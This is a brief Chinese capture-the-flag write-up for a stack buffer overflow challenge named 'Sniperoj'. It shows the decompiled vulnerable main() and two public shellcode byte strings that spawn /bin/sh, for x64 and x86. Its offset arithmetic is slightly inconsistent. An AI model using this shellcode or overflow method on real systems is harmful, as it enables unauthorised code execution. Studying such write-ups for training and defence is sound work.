## 解答
主程序
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+0h] [rbp-10h]
  __int64 v5; // [rsp+8h] [rbp-8h]

  buf = 0LL;
  v5 = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to Sniperoj!");
  printf("Do your kown what is it : [%p] ?\n", &buf, 0LL, 0LL);
  puts("Now give me your answer : ");
  read(0, &buf, 0x40uLL);
  return 0;
}
```
想棧上輸入shellcode，然後跳轉到shellcode執行
但是這題有空間大小限制，0x40個字節，還要減去buf距離eip的空間0x16，再減去0x8的返回地址，只剩下0x20的大小。
這裏用到一段x64上只有23個字節的shellcode
```
https://www.exploit-db.com/exploits/36858/
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```
還找到一個x86上的19個字節的shellcode，但是在這裏好像只能用上面這個
```
https://www.exploit-db.com/exploits/40131
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
```